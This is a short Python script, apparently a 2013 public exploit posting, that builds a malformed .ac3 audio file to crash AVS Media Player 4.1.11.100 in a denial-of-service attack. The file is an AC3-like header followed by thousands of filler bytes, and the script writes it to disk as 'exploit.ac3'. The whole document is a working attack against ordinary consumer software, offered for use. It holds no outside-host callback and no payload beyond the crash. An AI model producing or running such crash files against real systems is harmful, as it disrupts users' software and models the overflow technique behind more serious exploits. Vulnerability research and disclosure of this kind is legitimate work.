#!/usr/bin/python
print """
 [+]Exploit Title:AVS Media Player(.ac3)Denial of Service Exploit
 [+]Vulnerable Product:4.1.11.100
 [+]Download Product:http://www.avs4you.com/de/downloads.aspx
 [+]All AVS4YOU Software has problems with format .ac3
 [+]Date: 29.06.2013
 [+]Exploit Author: metacom
 [+]RST
 [+]Tested on: Windows 7
 """

buffer=(
"\x0B\x77\x3E\x68\x50\x40\x43\xE1\x06\xA0\xB9"
"\x65\xFF\x3A\xBE\x7C\xF9\xF3\xE7\xCF\x9F\x3E"
)

junk = "\x41" * 5000
bob = "\x42" * 100

exploit = buffer+ junk + bob
 
try:
    rst= open("exploit.ac3",'w')
    rst.write(exploit)
    rst.close()
    print("\nExploit file created!\n")
except:
    print "Error"
